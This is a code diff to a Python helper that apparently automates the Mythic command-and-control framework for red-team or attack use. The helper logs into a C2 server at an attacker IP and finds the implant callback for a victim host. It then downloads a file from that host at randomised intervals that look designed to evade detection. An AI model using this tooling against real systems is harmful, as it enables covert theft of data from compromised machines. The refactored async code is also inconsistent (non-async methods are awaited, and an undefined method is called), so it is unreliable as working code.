@@ -7,14 +7,14 @@
  '''
 
 
-from mythic import Mythic
+from mythic import mythic
 from dotenv import load_dotenv
 from pathlib import Path
 import os
 from utils import util
 import time
 import random
-
+import asyncio
 
 dotenv_path = Path.cwd().joinpath('.env').as_posix()
 
@@ -28,9 +28,17 @@ logger = util.create_logger(Path.cwd().parent.parent.joinpath("logs", Path(__fil
 
 class MythicHelper:
     def __init__(self,):
-        self.mythic = Mythic(username=os.environ.get("USERNAME"), password=os.environ.get("PASSWORD"), \
-                             server_ip=os.environ.get("ATTACK_IP"))
-        self.mythic.login()
+        self.mythic = None
+    
+    async def async_init(self):
+        self.mythic = await mythic.login(
+                    username=os.environ.get("USERNAME"),
+                    password=os.environ.get("PASSWORD"),
+                    server_ip=os.environ.get("ATTACK_IP"),
+                    server_port=7443,
+                    timeout=-1,
+                    ssl=True
+                )
 
     def locate_callback(self, match_key, match_value):
         ''' automatically locate the callback by matching specific key-value pairs
@@ -41,7 +49,9 @@ class MythicHelper:
         
         '''
         callbacks = self.mythic.get_all_callbacks()
+        print(callbacks)
         for callback in callbacks:
+            print(callback)
             if callback.get(match_key) == match_value:
                 logger.info(f"Found callback: {callback}")
                 return callback
@@ -93,15 +103,19 @@ class MythicHelper:
                 logger.warn(f"An error occurred during download process: {e}")
                 pass
                     
-
-if __name__ == "__main__":
+async def main():
     helper = MythicHelper()
+    await helper.async_init()  # Initialize and log in
+
     hostname = "10.0.0.5"
-    # locate callback by hostname   
-    callback = helper.locate_callback("host", hostname)
+    # Locate callback by hostname
+    callback = await helper.locate_callback("IP", hostname)
     if callback:
         callback_id = callback['id']
-        # default saved location --- current folder
+        # Default saved location --- current folder
         file_path = Path.cwd().joinpath("system.json")
-        helper.download_file_random_interval(callback_id, file_path, min_interval=120, max_interval=3600) 
+        await helper.down_send_file(callback_id, file_path, min_interval=120, max_interval=3600)
 
+
+if __name__ == "__main__":
+    asyncio.run(main())
